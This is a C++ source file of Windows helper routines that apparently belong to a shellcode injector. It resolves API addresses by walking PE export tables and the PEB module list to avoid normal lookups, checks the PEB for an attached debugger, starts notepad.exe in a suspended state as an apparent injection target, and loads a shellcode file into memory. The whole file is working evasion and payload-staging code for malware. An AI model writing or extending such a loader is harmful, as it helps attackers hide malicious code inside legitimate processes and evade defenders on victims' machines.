#include <windows.h>
#include "structs.h"
#include "stdio.h"


FARPROC GetExportedFunctionAddress(HMODULE hModule, LPCSTR functionName) {
	if (!hModule) {
		printf("Invalid module handle.\n");
		return nullptr;
	}

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* pAddressOfNames = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
	DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);
	WORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExportDir->NumberOfNames; ++i) {
		LPCSTR currentFunctionName = (LPCSTR)((BYTE*)hModule + pAddressOfNames[i]);
		if (strcmp(currentFunctionName, functionName) == 0) {
			DWORD functionRVA = pAddressOfFunctions[pAddressOfNameOrdinals[i]];
			FARPROC functionAddress = (FARPROC)((BYTE*)hModule + functionRVA);
			return functionAddress;
		}
	}

	printf("Function not found in export table.\n");
	return nullptr;
}


BOOL CompareLpcstrToUnicodeString(LPCSTR lpcstr, const UNICODE_STRING& unicodeString) {
	int len = MultiByteToWideChar(CP_ACP, 0, lpcstr, -1, NULL, 0);
	if (len == 0) {
		return false;
	}

	wchar_t* wideStr = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, lpcstr, -1, wideStr, len);
	bool result = (_wcsnicmp(wideStr, unicodeString.Buffer, unicodeString.Length / sizeof(wchar_t)) == 0);

	delete[] wideStr;

	return result;
}


PPEB NTgetPeb(void) {
	PTEB teb = NtCurrentTeb();
	return (PPEB)teb->Peb;
}


BOOL CheckDebbuger(void) {
	PPEB peb = NTgetPeb();
	BOOL is_deb = peb->BeingDebugged;
	if (!is_deb) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}


HMODULE GetDH(IN LPCSTR lpModuleName) {
	PPEB peb = NTgetPeb();
	PLDR_MODULE Module = NULL;
	CHAR wDllName[64] = { 0 };
	PLIST_ENTRY Head = &peb->LoaderData->InMemoryOrderModuleList;
	PLIST_ENTRY Next = Head->Flink;
	Module = (PLDR_MODULE)((PBYTE)Next - 16);


	while (Next != Head) {
		Module = (PLDR_MODULE)((PBYTE)Next - 16);
		if (Module->BaseDllName.Buffer != NULL) {
			if (CompareLpcstrToUnicodeString(lpModuleName, Module->BaseDllName) == TRUE) {
				return (HMODULE)Module->BaseAddress;
			}


		}
		Next = Next->Flink;
	}
	return NULL;
}


BOOL LaunchnotepadAndGetPID(OUT PROCESS_INFORMATION* pi) {
	STARTUPINFOA si = { 0 };
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(pi, sizeof(*pi));

	si.cb = sizeof(si);

	if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, pi)) {
		printf("[-] Fucked!\n");
		return FALSE;
	}
	return TRUE;
}

BOOL ReadShellcodeFile(CHAR* shellcodeName, LPVOID* shellcode, SIZE_T* shellcodeSize) {
	HANDLE hFile = INVALID_HANDLE_VALUE;

	hFile = CreateFileA(shellcodeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open shellcode file\n");
		return FALSE;
	}

	DWORD sizeLow = GetFileSize(hFile, NULL);
	if (sizeLow == INVALID_FILE_SIZE) {
		CloseHandle(hFile);
		printf("[-] Failed to get file size\n");
		return FALSE;
	}

	*shellcodeSize = (SIZE_T)sizeLow;

	*shellcode = VirtualAlloc(NULL, *shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*shellcode == NULL) {
		printf("[-] Failed to allocate memory for shellcode\n");
		CloseHandle(hFile);
		return FALSE;
	}

	DWORD bytesRead = 0;
	if (!ReadFile(hFile, *shellcode, (DWORD)*shellcodeSize, &bytesRead, NULL) || bytesRead != *shellcodeSize) {
		printf("[-] Failed to read shellcode file\n");
		VirtualFree(*shellcode, 0, MEM_RELEASE);
		*shellcode = NULL;
		CloseHandle(hFile);
		return FALSE;
	}

	CloseHandle(hFile);
	return TRUE;
}





